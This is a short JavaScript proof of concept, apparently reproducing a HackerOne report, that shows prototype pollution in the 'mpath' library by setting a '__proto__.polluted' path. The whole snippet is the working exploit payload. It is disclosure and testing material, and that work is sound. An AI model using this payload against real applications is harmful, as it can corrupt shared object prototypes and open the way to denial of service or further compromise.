//https://hackerone.com/reports/390860
var mpath = require("mpath");
var obj = {}
mpath.set('__proto__.polluted','yes', obj);
